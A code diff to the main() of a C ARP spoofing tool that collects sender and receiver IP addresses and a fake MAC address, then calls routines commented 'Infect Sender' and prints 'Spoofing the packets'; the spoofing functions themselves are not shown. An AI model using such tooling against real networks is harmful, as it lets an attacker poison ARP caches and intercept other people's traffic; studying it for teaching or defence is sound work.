@@ -22,13 +22,18 @@ int main()
 	char buf[INET_ADDRSTRLEN];
 	char victim_ip[INET_ADDRSTRLEN];
 	char iface[] = "eth0";
-	pcap_t *handle = NULL;
+
 	u_char *s_mac;
 	u_char *d_mac;
 	u_char *r_mac;
+	u_char *f_mac;
+	
+	char tmp_mac[20];
+	int tmp_val[ETHER_ADDR_LEN];
 
 	struct in_addr s_ip;
 	struct in_addr d_ip;
+	struct in_addr r_ip;
 
 	fd = socket(AF_INET, SOCK_DGRAM, 0);
 
@@ -36,7 +41,7 @@ int main()
 
 	strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
 
-	puts("IP address of the target : ");
+	puts("IP address of the sender : ");
 	
 	while(1)
 	{
@@ -60,6 +65,7 @@ int main()
 	s_mac = (u_char *)malloc(ETHER_ADDR_LEN);
 	d_mac = (u_char *)malloc(ETHER_ADDR_LEN);
 	r_mac = (u_char *)malloc(ETHER_ADDR_LEN);
+	f_mac = (u_char *)malloc(ETHER_ADDR_LEN);
 
 	memcpy(s_mac, (u_char *)ifr.ifr_hwaddr.sa_data, 6);
 	
@@ -76,14 +82,54 @@ int main()
 	ioctl(fd, SIOCGIFBRDADDR, &ifr);
 	printf("Gateway: %s\n", inet_ntop(AF_INET, &(((struct sockaddr_in *)&ifr.ifr_broadaddr) -> sin_addr), buf, sizeof(buf)));
 
-	printf("\nVictim Network Status: \n");
-
-	arp_main(s_mac, d_mac, r_mac, s_ip, d_ip, handle);
+	puts("\nWrite Receiver IP address: ");
 	
-	packet_spoof(s_mac, d_mac, r_mac, s_ip, d_ip);
+	while(1)
+	{
+		fgets(buf, sizeof(buf), stdin);
+		buf[strlen(buf) -1 ] = '\0';
+
+		if(inet_pton(AF_INET, buf, &r_ip.s_addr) == 0)
+		{
+			printf("Invalid IP address! \n");
+			continue;
+		}
+		else
+			break;
+	}
+
+	puts("\nWrite FAKE MAC address: ");
+	
+	while(1)
+	{
+		fgets(tmp_mac, sizeof(tmp_mac), stdin);
+		tmp_mac[strlen(tmp_mac) - 1] = '\0';
+
+		if(sscanf(tmp_mac, "%x:%x:%x:%x:%x:%x", 
+			&tmp_val[0], &tmp_val[1], &tmp_val[2],
+			&tmp_val[3], &tmp_val[4], &tmp_val[5]) == ETHER_ADDR_LEN)
+		{
+			for (int i = 0; i < 6; i++)
+				f_mac[i] = (uint8_t) tmp_val[i];
+			break;
+		}
+		else
+		{
+			printf("Invalid MAC address! (00:00:00:00:00:00) \n");
+		}
+	}
+
+	arp_main(s_mac, d_mac, r_mac, f_mac, s_ip, d_ip, r_ip);		//Infect Sender
+	//arp_main(s_mac, d_mac, r_mac, f_mac, s_ip, r_ip, handle, 2);	//Infect Receiver
+
+	printf("Spoofing the packets....\n");
+	
+	packet_spoof(s_mac, f_mac, d_mac, r_mac, s_ip, d_ip, r_ip);
 	
 	close(fd);
 	free(s_mac);
 	free(d_mac);
+	free(r_mac);
+	free(f_mac);
 	return 0;
 }
